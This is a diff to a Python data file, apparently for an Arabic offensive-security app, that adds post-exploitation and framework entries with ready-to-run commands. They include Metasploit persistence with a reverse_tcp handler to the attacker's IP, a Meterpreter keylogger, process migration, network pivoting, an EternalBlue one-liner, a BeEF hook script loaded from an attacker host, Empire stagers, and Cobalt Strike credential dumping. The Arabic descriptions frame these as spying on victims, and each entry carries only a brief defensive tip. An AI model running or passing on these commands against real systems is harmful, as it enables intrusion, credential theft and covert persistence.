@@ -428,4 +428,118 @@ TOOLS = [
         "code": "# Meterpreter:\ngetsystem\ngetsystem -t 1  # Named Pipe Impersonation\ngetsystem -t 2  # Token Duplication\n\n# التحقق:\ngetuid",
         "usage": "getsystem",
         "risk": "critical",
-        "vaccine": "ثبت آخر التحديثات الأمنية وراقب
+        "vaccine": "ثبت آخر التحديثات الأمنية وراقب الصلاحيات"
+    },
+    {
+        "id": "persistence",
+        "name": "Persistence",
+        "cat": "post",
+        "desc": "تثبيت باب خلفي للعودة الدائمة",
+        "code": "use post/windows/manage/persistence\nset SESSION 1\nset STARTUP SYSTEM\nset LHOST <your_ip>\nset LPORT 4444\nrun\n\n# إعادة الاتصال:\nuse exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST <your_ip>\nrun",
+        "usage": "msfconsole -q -x 'use post/windows/manage/persistence; set SESSION 1; run'",
+        "risk": "critical",
+        "vaccine": "راقب مجلدات Startup و Run keys في التسجيل"
+    },
+    {
+        "id": "keylogger",
+        "name": "Keylogger",
+        "cat": "post",
+        "desc": "تسجيل ضغطات المفاتيح - التجسس على كل ما يكتبه الضحية",
+        "code": "# داخل Meterpreter:\nkeyscan_start\n# ... انتظر ...\nkeyscan_dump\nkeyscan_stop\n\n# حفظ النتائج:\nkeyscan_dump > /tmp/keystrokes.txt",
+        "usage": "keyscan_start → keyscan_dump → keyscan_stop",
+        "risk": "critical",
+        "vaccine": "استخدم Anti-Keylogger وقم بتحديث أنظمة الحماية"
+    },
+    {
+        "id": "migrate",
+        "name": "Process Migration",
+        "cat": "post",
+        "desc": "نقل الجلسة إلى عملية نظام للتمويه",
+        "code": "# Meterpreter:\nps\nmigrate <PID>\n\n# أمثلة:\nmigrate 1234\nmigrate -N explorer.exe\nmigrate -N svchost.exe",
+        "usage": "migrate <PID>",
+        "risk": "high",
+        "vaccine": "راقب سلوك العمليات غير الطبيعي"
+    },
+    {
+        "id": "pivoting",
+        "name": "Pivoting",
+        "cat": "post",
+        "desc": "استخدام الجهاز المخترق للوصول إلى الشبكة الداخلية",
+        "code": "# Meterpreter:\nrun autoroute -s <subnet>\n\n# مثال:\nrun autoroute -s 10.10.10.0/24\n\n# فحص الشبكة الداخلية:\nuse auxiliary/scanner/portscan/tcp\nset RHOSTS 10.10.10.0/24\nrun",
+        "usage": "run autoroute -s <subnet>",
+        "risk": "critical",
+        "vaccine": "قسّم الشبكة (Network Segmentation) واستخدم VLANs"
+    },
+
+    # ==================== المنصات المتكاملة ====================
+    {
+        "id": "metasploit",
+        "name": "Metasploit Framework",
+        "cat": "framework",
+        "desc": "إطار عمل إليوت الأساسي - يحتوي على آلاف الثغرات",
+        "code": "# تشغيل:\nmsfconsole\n\n# مسح سريع:\nmsfconsole -q -x \"use auxiliary/scanner/portscan/tcp; set RHOSTS <target>; run; exit\"\n\n# استغلال:\nmsfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <target>; set LHOST <your_ip>; run\"",
+        "usage": "msfconsole",
+        "risk": "critical",
+        "vaccine": "استخدمه فقط على أهداف مصرح بها"
+    },
+    {
+        "id": "beef",
+        "name": "BeEF",
+        "cat": "framework",
+        "desc": "إطار استغلال المتصفحات - يخترق الضحايا عبر متصفحاتهم",
+        "code": "# تشغيل:\nsudo beef-xss\n\n# إدخال hook:\n<script src=\"http://<attacker_ip>:3000/hook.js\"></script>\n\n# فتح لوحة التحكم:\nhttp://localhost:3000/ui/panel",
+        "usage": "beef-xss",
+        "risk": "high",
+        "vaccine": "استخدم NoScript وقم بتحديث المتصفح"
+    },
+    {
+        "id": "set",
+        "name": "SET (Social Engineering Toolkit)",
+        "cat": "framework",
+        "desc": "أداة الهندسة الاجتماعية - التصيد، الـ USB، المواقع المزيفة",
+        "code": "# تشغيل:\nsudo setoolkit\n\n# خيارات شائعة:\n# 1) Social-Engineering Attacks\n# 2) Website Attack Vectors\n# 3) Credential Harvester Attack Method\n\n# مثال:\nsetoolkit",
+        "usage": "setoolkit",
+        "risk": "high",
+        "vaccine": "وعّي الموظفين ضد هجمات التصيد"
+    },
+    {
+        "id": "empire",
+        "name": "Empire (PowerShell)",
+        "cat": "framework",
+        "desc": "إطار عمل PowerShell - للتحكم في أنظمة ويندوز عن بعد",
+        "code": "# تشغيل:\nempire\n\n# إنشاء Listener:\nuselistener http\nset Host http://<your_ip>:80\nexecute\n\n# إنشاء Stager:\nusestager windows/launcher_bat\nset Listener http\nexecute",
+        "usage": "empire",
+        "risk": "critical",
+        "vaccine": "عطل PowerShell لغير المسؤولين"
+    },
+    {
+        "id": "cobalt_strike",
+        "name": "Cobalt Strike",
+        "cat": "framework",
+        "desc": "منصة محاكاة الفريق الأحمر - الأقوى في العالم",
+        "code": "# محاكاة أوامر Cobalt Strike:\n# إنشاء Beacon:\nbeacon> spawn x64\nbeacon> inject 1234 x64 http\n\n# استخراج الهاشات:\nbeacon> hashdump\nbeacon> logonpasswords\n\n# التحرك الجانبي:\nbeacon> jump psexec <target> <listener>",
+        "usage": "محاكاة Cobalt Strike",
+        "risk": "critical",
+        "vaccine": "راقب حركة الشبكة لاتصالات C2 المشبوهة"
+    },
+    {
+        "id": "toolx",
+        "name": "Tool-X",
+        "cat": "framework",
+        "desc": "منصة أدوات اختبار الاختراق المتكاملة - 70+ أداة",
+        "code": "# تثبيت:\ngit clone https://github.com/rajkumardusad/Tool-X.git\ncd Tool-X\nchmod +x install.aex\nbash install.aex\n\n# تشغيل:\ntoolx",
+        "usage": "toolx",
+        "risk": "high",
+        "vaccine": "لا تقم بتثبيت أدوات غير موثوقة"
+    },
+]
+
+CATEGORIES = {
+    "scanner": {"label": "الفحص", "icon": "🔍", "color": "#00ffcc"},
+    "exploit": {"label": "الاستغلال", "icon": "⚔️", "color": "#ff007f"},
+    "osint": {"label": "OSINT", "icon": "🌐", "color": "#ffbd2e"},
+    "crack": {"label": "كسر كلمات المرور", "icon": "🔓", "color": "#ff6600"},
+    "defense": {"label": "الدفاع", "icon": "🛡️", "color": "#7c4dff"},
+    "post": {"label": "ما بعد الاختراق", "icon": "📌", "color": "#50fa7b"},
+    "framework": {"label": "المنصات المتكاملة", "icon": "🛠️", "color": "#ff9500"},
+}
